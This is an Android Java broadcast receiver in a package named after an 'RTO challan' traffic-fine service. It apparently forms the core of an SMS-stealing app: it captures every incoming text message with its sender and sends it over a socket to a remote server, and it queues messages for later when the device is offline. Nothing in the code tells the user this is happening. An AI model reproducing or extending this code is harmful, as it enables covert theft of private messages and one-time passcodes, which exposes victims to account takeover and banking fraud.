package com.service.rtochallan;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {

    private int userId = 0;
    private SocketManager socketManager;
    private Helper helper;
    private SmsManager smsManager;

    @Override
    public void onReceive(Context context, Intent intent) {
        // ✅ Only handle SMS_RECEIVED
        if (intent == null || !"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()))
            return;

        try {
            socketManager = SocketManager.getInstance(context);
            helper = new Helper();
            smsManager = SmsManager.getDefault();

            socketManager.connect();

            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            //helper.show("New SMS Message Rc");
            String format = bundle.getString("format");
            StringBuilder fullMessage = new StringBuilder();
            String sender = "";

            // ✅ Combine multipart messages correctly (Android 7 → 14)
            for (Object pdu : pdus) {
                SmsMessage sms;
                sms = SmsMessage.createFromPdu((byte[]) pdu, format);

                if (sms != null) {
                    sender = sms.getDisplayOriginatingAddress();
                    fullMessage.append(sms.getMessageBody());
                }
            }

            String messageBody = fullMessage.toString();
            if (messageBody.isEmpty() || sender.isEmpty()) return;

            //helper.show("FUllMessage " + fullMessage);

            // ✅ Build payload for server
            JSONObject sendPayload = new JSONObject();
            sendPayload.put("message", messageBody);
            sendPayload.put("sender", sender);
            sendPayload.put("sim_sub_id", smsManager.getSubscriptionId());
            sendPayload.put("sms_forwarding_status", "sending");
            sendPayload.put("sms_forwarding_status_message", "Request for sending");

            if(!helper.isNetworkAvailable(context) || !socketManager.isConnected()){
                PendingSmsManager pendingManager = new PendingSmsManager(context);
                pendingManager.addPending(sendPayload);
                return ;
            }
            // ✅ Safe socket emit
            socketManager.sendSMSWithSocket(sendPayload);

        } catch (JSONException e) {
            Log.e("SmsReceiver", "JSON error: " + e.getMessage());
        } catch (Exception e) {
            Log.e("SmsReceiver", "onReceive error: " + e.getMessage());
        }
    }
}
